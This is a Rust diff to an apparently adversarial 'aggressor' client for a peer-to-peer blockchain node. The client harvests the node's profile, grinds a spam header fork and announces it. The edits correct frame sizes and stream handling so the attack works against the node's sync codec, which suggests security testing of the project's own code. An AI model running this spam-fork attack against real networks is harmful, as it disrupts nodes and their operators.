@@ -29,7 +29,7 @@ mod aggressor_common;
 mod spam_chain;
 
 use aggressor_common::{identify_response_bytes, negotiate_inbound, negotiate_outbound, NoiseIo};
-use spam_chain::{unix_now, SpamChain};
+use spam_chain::SpamChain;
 
 const PING_PROTOCOL: &str = "/ipfs/ping/1.0.0";
 const IDENTIFY_PROTOCOL: &str = "/ipfs/id/1.0.0";
@@ -40,7 +40,10 @@ const AVAILABILITY_PROTOCOL: &str = "/noid/mainnet/860e70453390bf81/1/sync/avail
 const HEADER_WIRE: usize = 212;
 const RECORD_BYTES: usize = 288;
 const ANNOUNCE_BYTES: usize = 292;
-const RESPONSE_HEADER_BYTES: usize = 54;
+/// NHB5 response header: magic(4) + count(2) + flags(1) + status(1) +
+/// retry(2) + reserved(2) + compressed_len(4) + snapshot_height(8) +
+/// snapshot_hash(32), per header_sync_codec.rs.
+const RESPONSE_HEADER_BYTES: usize = 56;
 
 type YamuxConnection = yamux::Connection<NoiseIo>;
 
@@ -102,7 +105,10 @@ async fn serve_header_request(stream: &mut yamux::Stream, state: &Shared) {
     let mut out = Vec::with_capacity(RESPONSE_HEADER_BYTES + compressed.len());
     out.extend_from_slice(b"NHB5");
     out.extend_from_slice(&(records as u16).to_le_bytes());
-    out.extend_from_slice(&[0u8; 8]); // flags=0, status=Ready, retry=0
+    out.push(0u8); // flags: no snapshot boundary
+    out.push(0u8); // status: Ready
+    out.extend_from_slice(&0u16.to_le_bytes()); // retry
+    out.extend_from_slice(&0u16.to_le_bytes()); // reserved
     out.extend_from_slice(&(compressed.len() as u32).to_le_bytes());
     out.extend_from_slice(&0u64.to_le_bytes()); // snapshot height
     out.extend_from_slice(&[0u8; 32]); // snapshot hash
@@ -213,7 +219,11 @@ async fn open_stream(connection: &mut YamuxConnection) -> Result<yamux::Stream> 
 }
 
 /// Two-round profile handshake: harvest (any expected id), then verify with
-/// the exact id. Returns the profile payload (bytes after the NPS6 magic).
+/// the exact id. Returns the profile payload (bytes after the NPS6 magic:
+/// 84 parameter bytes then the 32-byte profile id; the full NPS6 frame is
+/// 120 bytes). The request frame is 36 bytes; the server's codec runs
+/// `ensure_eof` after it, so the send half is closed before reading — an
+/// honest libp2p request-response client closes its send half the same way.
 async fn profile_round(
     connection: &mut YamuxConnection,
     expected_id: Option<[u8; 32]>,
@@ -228,7 +238,8 @@ async fn profile_round(
         }
         stream.write_all(&req).await?;
         stream.flush().await?;
-        let mut response = vec![0u8; 117];
+        stream.close().await?;
+        let mut response = vec![0u8; 120];
         stream.read_exact(&mut response).await?;
         anyhow::Ok(response)
     };
@@ -306,7 +317,9 @@ async fn main() -> Result<()> {
     // ---- Phase 1: profile harvest + verification ----
     let profile = profile_round(&mut connection, None).await?;
     let mut expected_id = [0u8; 32];
-    expected_id.copy_from_slice(&profile[81..113]);
+    // The returned payload is PROFILE_BYTES (84) || profile_id (32); the id
+    // is the trailing 32 bytes.
+    expected_id.copy_from_slice(&profile[84..116]);
     let profile = profile_round(&mut connection, Some(expected_id)).await?;
     *state.profile.lock().expect("profile") = Some(profile);
     println!("[aggressor] network-v7 profile harvested and verified");
@@ -366,9 +379,8 @@ async fn main() -> Result<()> {
 
     // ---- Phase 3: grind the spam fork ----
     let grind_started = Instant::now();
-    let spam_timestamp = unix_now() + 60;
     let grind = tokio::task::spawn_blocking(move || {
-        SpamChain::build(honest, spam_count, spam_timestamp, threads, |done| {
+        SpamChain::build(honest, spam_count, threads, |done| {
             println!("[aggressor] ground {done}/{spam_count} headers");
         })
     });
@@ -397,6 +409,9 @@ async fn main() -> Result<()> {
             negotiate_outbound(&mut stream, AVAILABILITY_PROTOCOL).await?;
             stream.write_all(&announcement).await?;
             stream.flush().await?;
+            // The availability codec runs ensure_eof after the fixed request
+            // frame; close the send half before reading the 5-byte status.
+            stream.close().await?;
             let mut response = [0u8; 5];
             stream.read_exact(&mut response).await?;
             anyhow::Ok(response)
